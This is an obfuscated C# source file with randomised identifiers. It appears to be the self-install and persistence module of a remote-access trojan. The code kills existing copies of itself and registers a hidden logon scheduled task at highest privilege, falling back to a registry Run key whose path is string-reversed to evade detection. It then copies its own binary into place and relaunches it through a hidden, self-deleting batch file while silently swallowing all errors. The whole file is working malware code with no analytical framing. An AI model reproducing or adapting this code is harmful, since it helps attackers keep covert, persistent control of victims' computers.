using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using jRqllyjXpPF;
using tXzQcBesFjj;

namespace XxxXTuAFNREHAm;

internal class hqABsoIhpEaOLsN
{
	public static void WlykGFPbyW()
	{
		try
		{
			FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(dqIziPtAElY.ELjURpolNyX), dqIziPtAElY.aAqMmVzlRUR));
			string fileName = Process.GetCurrentProcess().MainModule!.FileName;
			if (!(fileName != fileInfo.FullName))
			{
				return;
			}
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.MainModule!.FileName == fileInfo.FullName)
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			if (ieGRLlRyWBE.DhtRvAvrNyXuS())
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "cmd";
				processStartInfo.Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(fileInfo.Name) + "\" /tr '\"" + fileInfo.FullName + "\"' & exit";
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				Process.Start(processStartInfo);
			}
			else
			{
				using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), "\"" + fileInfo.FullName + "\"");
			}
			if (File.Exists(fileInfo.FullName))
			{
				File.Delete(fileInfo.FullName);
				Thread.Sleep(1000);
			}
			FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
			byte[] array = File.ReadAllBytes(fileName);
			fileStream.Write(array, 0, array.Length);
			ieGRLlRyWBE.YYVwVmyIiqIhHY();
			string text = Path.GetTempFileName() + ".bat";
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("timeout 3 > NUL");
				streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
				streamWriter.WriteLine("CD " + Path.GetTempPath());
				streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
			}
			Process.Start(new ProcessStartInfo
			{
				FileName = text,
				CreateNoWindow = true,
				ErrorDialog = false,
				UseShellExecute = false,
				WindowStyle = ProcessWindowStyle.Hidden
			});
			Environment.Exit(0);
		}
		catch (Exception)
		{
		}
	}
}
